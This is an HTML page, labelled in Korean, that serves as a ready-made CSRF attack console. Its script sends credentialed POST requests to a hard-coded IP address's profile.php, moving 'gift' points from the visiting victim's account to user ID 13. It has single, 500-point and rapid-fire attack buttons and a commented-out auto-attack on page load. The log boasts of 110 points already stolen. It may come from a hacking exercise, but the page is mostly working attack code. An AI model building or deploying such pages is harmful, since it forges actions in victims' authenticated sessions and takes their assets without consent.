<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>🎯 직접 Fetch CSRF</title>
    <style>
        body { 
            font-family: Arial; 
            padding: 30px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            text-align: center;
        }
        .container {
            background: rgba(0, 0, 0, 0.8);
            border: 3px solid #00ff00;
            padding: 40px;
            margin: 20px auto;
            border-radius: 15px;
            max-width: 800px;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
        }
        .status {
            background: rgba(0, 255, 0, 0.1);
            padding: 15px;
            margin: 15px 0;
            border-radius: 8px;
            border-left: 4px solid #00ff00;
            font-family: monospace;
        }
        button {
            background: linear-gradient(45deg, #00ff00, #00cc00);
            color: black;
            border: none;
            padding: 15px 25px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            margin: 10px;
            transition: all 0.3s;
        }
        button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
        }
        input {
            background: rgba(0, 0, 0, 0.7);
            border: 2px solid #00ff00;
            color: #00ff00;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            margin: 5px;
        }
        .log {
            background: rgba(0, 0, 0, 0.5);
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            text-align: left;
            font-family: monospace;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ 직접 Fetch CSRF 공격</h1>
        <h2>🎯 성공한 방식 그대로 사용</h2>
        
        <div id="status" class="status">
            Ready to attack hacker (ID: 13)
        </div>
        
        <div>
            <label>포인트: </label>
            <input type="number" id="points" value="100" min="1" max="1000">
            
            <label>메시지: </label>
            <input type="text" id="message" value="pwned" placeholder="공격 메시지">
        </div>
        
        <div style="margin: 20px 0;">
            <button onclick="quickAttack()">⚡ 빠른 공격</button>
            <button onclick="bigAttack()">💣 큰 공격 (500P)</button>
            <button onclick="rapidFire()">🔥 연속 공격 (5회)</button>
            <button onclick="checkTarget()">👁️ 타겟 확인</button>
        </div>
        
        <div id="logs" class="log">
            [READY] 성공한 fetch 방식으로 대기 중...<br>
            [INFO] 이전 성공: 10P + 100P = 총 110P 탈취됨<br>
        </div>
    </div>

    <script>
        let totalAttacks = 0;
        let successfulAttacks = 0;

        function addLog(message) {
            const now = new Date().toLocaleTimeString();
            const logDiv = document.getElementById('logs');
            logDiv.innerHTML = `[${now}] ${message}<br>` + logDiv.innerHTML;
            
            // 최대 15줄만 유지
            const lines = logDiv.innerHTML.split('<br>');
            if (lines.length > 15) {
                logDiv.innerHTML = lines.slice(0, 15).join('<br>');
            }
        }

        // 핵심 공격 함수 - 성공한 fetch 방식 그대로
        async function executeAttack(points, message = 'attack') {
            totalAttacks++;
            addLog(`🚀 공격 시작: ${points}P`);
            
            try {
                const response = await fetch('http://3.36.66.216/profile.php?gift_to=13', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `send_gift=1&receiver_id=13&gift_type=coffee&points=${points}&message=${message}`,
                    credentials: 'include'
                });
                
                addLog(`✅ 응답: ${response.status} (${points}P 전송)`);
                
                if (response.status === 200) {
                    successfulAttacks++;
                    document.getElementById('status').innerHTML = 
                        `🎉 성공! 총 공격: ${totalAttacks}회 | 성공: ${successfulAttacks}회`;
                    return true;
                }
            } catch (error) {
                addLog(`❌ 오류: ${error.message}`);
                return false;
            }
        }

        // 버튼 함수들
        async function quickAttack() {
            const points = document.getElementById('points').value;
            const message = document.getElementById('message').value;
            await executeAttack(points, message);
        }

        async function bigAttack() {
            if (confirm('💣 500P 대량 공격을 실행하시겠습니까?')) {
                await executeAttack(500, 'bigattack');
            }
        }

        async function rapidFire() {
            addLog('🔥 연속 공격 모드 시작!');
            const basePoints = Math.floor(document.getElementById('points').value / 5);
            
            for (let i = 1; i <= 5; i++) {
                await executeAttack(basePoints, `rapid${i}`);
                if (i < 5) {
                    addLog(`⏳ ${i}/5 완료, 2초 대기...`);
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
            }
            addLog('🎉 연속 공격 완료!');
        }

        function checkTarget() {
            addLog('🔍 hacker 프로필 확인...');
            window.open('http://3.36.66.216/profile.php?user_id=13', 'target', 'width=800,height=600');
        }

        // 자동 시작 (선택사항)
        window.addEventListener('load', function() {
            addLog('⚡ CSRF 공격 시스템 로드 완료');
            addLog('🎯 타겟: hacker (ID: 13)');
            
            // 5초 후 자동 공격 (원하면 주석 해제)
            // setTimeout(() => executeAttack(50, 'autostart'), 5000);
        });
    </script>
</body>
</html>
